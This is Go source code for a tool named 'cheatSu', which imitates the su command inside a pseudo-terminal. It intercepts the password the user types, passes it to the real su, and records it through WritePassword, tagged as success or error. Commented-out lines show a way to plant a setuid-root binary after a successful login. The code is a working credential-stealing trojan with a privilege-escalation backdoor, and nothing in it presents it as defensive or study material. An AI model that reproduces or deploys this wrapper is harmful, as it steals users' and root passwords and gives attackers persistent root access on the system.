package main

import (
	"bufio"
	"fmt"
	"github.com/google/goterm/term"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
)

var SuFail = regexp.MustCompile(`failure`)
var SuAsk = regexp.MustCompile(`assword: $`)

//TODO 修复su切换用户后无法使用tab自动补全，无法处理交互式命令
func cheatSu() {
	var pty, err = term.OpenPTY()
	ExecIfErr(err)
	c := exec.Command("su", os.Args[1:]...)
	c.Stdout = pty.Slave
	c.Stdin = pty.Slave
	c.Stderr = pty.Slave
	c.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true}
	c.Start()
	var password string
	var line string
	var lineByte []byte
	var AskPass bool
	var readLock = make(chan struct{})
	var ps1 string
	go func() {
		for {
			v, err := pty.ReadByte()
			if err != nil {
				//log.Fatalln(err)
				readLock <- struct{}{}
				return
			}
			lineByte = append(lineByte, v)
			line = string(lineByte)

			if SuAsk.MatchString(line) {
				fmt.Print(line)
				AskPass = true
				password = GetPassword()
				pty.Master.WriteString(password + "\r\n")
				line = ""
				lineByte = nil
			}
			if (v == 10 || v == 13) && AskPass {
				if password != "" && SuFail.MatchString(line) && strings.TrimSpace(line) != "" {
					WritePassword(password + " error")
					password = ""
				} else if password != "" && strings.TrimSpace(line) != "" {
					WritePassword(password + " success")
					//password = ""
					//test

					// method 1
					//pty.Master.WriteString("chmod 777 ./suid\n")
					//pty.Master.WriteString("chown root ./suid\n")
					//pty.Master.WriteString("chmod +s ./suid\n")
					//time.Sleep(time.Second/2)

					// method 2
					ps1 = strings.TrimSpace(line)
					startTerm(pty, ps1)
					//fmt.Println("ps1=",ps1)

					c.Process.Kill()
					readLock <- struct{}{}
					return
				}
				fmt.Print(line)
				line = ""
				lineByte = nil
			}

		}
	}()
	c.Wait()
	pty.Close()
	<-readLock
	if AskPass && password != "" {
		//c := exec.Command("./suid")
		//c.Stdout = os.Stdout
		//c.Stdin = os.Stdin
		//c.Stderr = os.Stderr
		//c.Run()
	}
	if !AskPass {
		ExecScript(cmd)
	}
}
func startTerm(pty *term.PTY, ps1 string) {
	var line string
	for {
		v, err := pty.ReadByte()
		if err != nil {
			return
		}
		fmt.Print(string(v))
		line = line + string(v)
		if v == 10 || v == 13 {
			line = ""
		}
		if strings.HasPrefix(line, ps1+" ") {
			//fmt.Println("oooooo:", cmdline)
			fmt.Println("11")
			reader := bufio.NewReader(os.Stdin)
			input, _ := reader.ReadString('\n')
			input = strings.TrimSpace(input)
			pty.Master.WriteString(input + "\n")
			//fmt.Println(input)
			for i := 0; i < len(input+"\n"); i++ {
				pty.ReadByte()
			}
			line = ""
		}
	}

	//terminal.Restore(syscall.Stdin, oldTermState)
}
